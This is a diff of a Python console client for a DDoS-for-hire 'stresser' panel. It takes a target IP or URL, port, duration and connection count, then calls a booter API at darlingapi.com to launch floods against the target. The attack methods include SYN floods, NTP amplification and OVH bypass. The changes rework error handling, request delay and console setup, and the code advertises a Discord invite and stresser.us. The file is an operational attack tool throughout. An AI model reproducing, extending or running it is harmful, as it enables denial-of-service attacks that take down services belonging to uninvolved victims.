@@ -3,23 +3,24 @@ from httpx import get
 from os import system,_exit
 from sys import stdout
 from time import sleep
-from shutil import get_terminal_size
 from sty import fg
 
-system("CHCP 65001")
-exit=lambda _: _exit(0)
-_KEY="KEY_HERE"
+_USERNAME="larina"
+_KEY="YOUR_KEY_HERE"
+_DALAY=0.5 # wait delay per req
 _METHODS=["TCPRAW","TCPSYN","TCPACK","TCPTFO","TCPTLS","TCPAMP","VALVE","FIVEM","OVHAMP","OVHTCP","OVHUDP","SNMP","WSD","DVR","NTP","ARD","IGMP","GRE","ESP","IPRAND","TLSV1","TLSV2","UDPBYPASS"]
-__builtins__.print = lambda text="",end="\r\n": stdout.write(f"{text}{end}");stdout.flush()
-clearconsole = lambda : system("cls || clear")
 
-class color:
-    def __init__(self)->None:
-        self.text = 15
+__builtins__.print = lambda text="",end="\r\n": stdout.write(f"{text}{end}");stdout.flush()
+clearconsole = lambda:system("cls || clear")
+exit=lambda: _exit(0)
+
+class COLOR:
+    def __init__(self)->None: # https://i.stack.imgur.com/S8wtO.png
+        self.text   = 15
         self.invite = 82
-        self.logo = 117
-        self.line = 225
-_COLOR=color()
+        self.logo   = 117
+        self.line   = 225
+_COLOR=COLOR()
 
 def makec(text,color):
     return f"{fg(color)}{text}{fg.rs}"
@@ -35,13 +36,11 @@ def logo():
 \t██▄ ▀   ██    ██▀ ▀▀ ▄█▄▄▄██ ██▄ ▀  ██▄ ▀  ▄█▄▄▄██  ██▀ ▀▀     ██  ██  ██▄ ▀  
 \t▄ ▀█▄▄  ██    ██     ██      ▄ ▀█▄▄ ▄ ▀█▄▄ ██       ██         ██  ██  ▄ ▀█▄▄ 
 \t█▀▄▄█▀  ▀█▄▀ ▄██▄     ▀█▄▄▄▀ █▀▄▄█▀ █▀▄▄█▀  ▀█▄▄▄▀ ▄██▄        ▀█▄▄▀█▄ █▀▄▄█▀ """,_COLOR.logo))
-    printc(makec("\t\t\tdiscord.gg/cyber-hubs and stresser.us\n",_COLOR.invite))
+    printc(makec("\t\t\tdiscord.gg/vT8W3XzNZg and stresser.us\n",_COLOR.invite))
 
 def realint(s):
-    try:
-        return int(s)
-    except: 
-        return -1
+    try:return int(s)
+    except:return -1
 
 def isgoodipv4(s)->bool:
     pieces = s.split('.')
@@ -51,20 +50,27 @@ def isgoodipv4(s)->bool:
 
 def isgoodint(p,max)->bool:
     p=realint(p)
-    if p <= max and not (p <= 0): 
-        return True
+    if p <= max and not (p <= 0): return True
     return False
 
 def request(ip,port,time,conn,method):
-    try:
-        for _ in range(int(conn)):
+    for _ in range(int(conn)):
+        try:
             resp=get(f"https://darlingapi.com/?key={_KEY}&host={ip}&port={port}&time={time}&method={method}").json()
-            #print(resp)
-            sleep(0.2)
-        if resp["error"] == "yes":
-            return {"ok":False,"data":resp["data"]}
-        return {"ok":True,"data":resp["data"]}
-    except:return {"ok":False,"data":"api down?"}
+            print(makec(resp["data"],46 if resp["error"] != "yes" else 9))
+        except Exception as e:
+            try:
+                print(resp)
+                print(resp.text)
+            except:pass
+            if str(e) == "Expecting value: line 1 column 1 (char 0)":
+                print(makec("[!] servers full",9))
+            else:
+                print(e)
+                print(makec("[!] api down or idk error",9))
+        sleep(_DALAY)
+            
+            
 
 def helpcom():
     logo()
@@ -82,34 +88,30 @@ def clearcom():
     print("")
 
 def main():
-    print("\n"*14)
-    stdout.write("".center(50))
-    for cha in "welcome back, larina.":
-        stdout.write(cha)
-        stdout.flush()
-        sleep(0.1)
-    sleep(2)
+    # print("\n"*12)
+    # stdout.write("".center(50))
+    # for cha in "welcome back, larina.":
+    #     stdout.write(cha)
+    #     stdout.flush()
+    #     sleep(0.1)
+    # sleep(2)
     helpcom()
     while 1:
-        rawcommands=input(f'{makec("larina@us",196)}{makec(":~$",_COLOR.text)}{fg(81)} ').split(" ")
+        rawcommands=input(f'{makec(f"{_USERNAME}@us",196)}{makec(":~$",_COLOR.text)}{fg(81)} ').split(" ")
         commands=rawcommands[0].upper()
         args=rawcommands[1:]
         if commands in _METHODS:
             if len(args) < 3 or not (commands.startswith("TLS") or isgoodipv4(args[0])) or (not isgoodint(args[1],65535)) or (not isgoodint(args[2],1200)) or (not isgoodint(args[3],10)):
                 print(makec(f"[*] {commands} <ip/url> <port> <time> <conn>",99))
-            else:
-                resp=request(args[0],args[1],args[2],args[3],commands)
-                print(makec(resp["data"],46 if resp["ok"] == True else 9))
+            else: request(args[0],args[1],args[2],args[3],commands)
         else:   
             try:
                 commandslist[commands]()
-            except:
-                print(makec("[!] command not found",11))
+            except:print(makec("[!] command not found",11))
 
-   
 if __name__ == "__main__":
     commandslist={"EXIT":exit,"QUIT":exit,"HELP":helpcom,"CLEAR":clearcom}
-    sizec=get_terminal_size().columns-3
-    system("mode 130,30")
-    system("title stresser us panel private ^<3")
+    system("CHCP 65001 || clear") # set utf 8
+    system("mode 130,30 || clear")
+    system("title stresser us panel private ^<3 || clear")
     main()
